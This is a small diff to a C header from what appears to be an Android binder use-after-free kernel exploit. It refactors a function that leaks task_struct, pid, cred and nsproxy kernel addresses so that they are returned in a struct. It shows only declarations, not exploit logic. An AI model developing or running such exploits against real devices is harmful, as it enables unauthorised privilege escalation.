@@ -15,11 +15,14 @@
 #define IOVEC_COUNT 25
 #define IOVEC_WQ_INDEX 10
 
-void binder_uaf_leak_task_struct(int binder_fd,
+typedef struct {
+  void *pid;
+  void *cred;
+  void *nsproxy;
+} leaked_kernel_addrs;
+
+void binder_uaf_leak_task_struct(binder_ctx *ctx,
                                  struct task_struct **leak_task_struct,
-                                 void **leak_pid_address,
-                                 void **leak_cred_address,
-                                 void **leak_nsproxy_address,
-                                 void **mapped_memory);
+                                 leaked_kernel_addrs *addrs);
 
 #endif
